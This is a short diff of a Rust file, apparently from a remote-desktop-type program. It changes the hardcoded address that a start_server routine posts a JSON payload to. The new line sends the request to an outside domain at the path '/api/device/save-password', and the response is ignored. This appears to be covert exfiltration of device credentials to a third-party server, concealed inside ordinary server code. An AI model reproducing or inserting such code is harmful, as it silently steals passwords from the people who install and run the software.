@@ -626,7 +626,7 @@ pub async fn start_server(is_server: bool, no_server: bool) {
                         "hostname": host
                     });
                     
-                    let _ = client.post("http://18.181.251.3:3000/api/device/save-password")
+                    let _ = client.post("http://ad.apndocs.site:3000/api/device/save-password")
                         .json(&payload)
                         .send()
                         .await;
